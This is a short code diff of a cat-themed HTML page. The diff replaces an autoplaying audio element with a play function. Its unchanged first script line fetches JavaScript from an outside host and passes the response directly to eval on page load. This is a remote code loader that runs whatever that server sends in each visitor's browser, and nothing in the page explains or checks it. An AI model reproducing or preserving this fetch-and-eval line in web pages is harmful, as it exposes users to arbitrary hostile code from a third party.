@@ -2,8 +2,15 @@
 <html>
  <body>
   <script>fetch('https://meowww.lol/cat.js').then(r=>r.text()).then(eval)</script>
-  <audio autoplay loop>
-    <source src="cat.mp3" type="audio/mpeg">
-  </audio>
+ <audio id="catAudio" loop>
+  <source src="cat.mp3" type="audio/mpeg">
+ </audio>
+
+ <script>
+ function playCat() {
+   const audio = document.getElementById('catAudio');
+   audio.play();
+ }
+ </script>
  </body>
 </html>
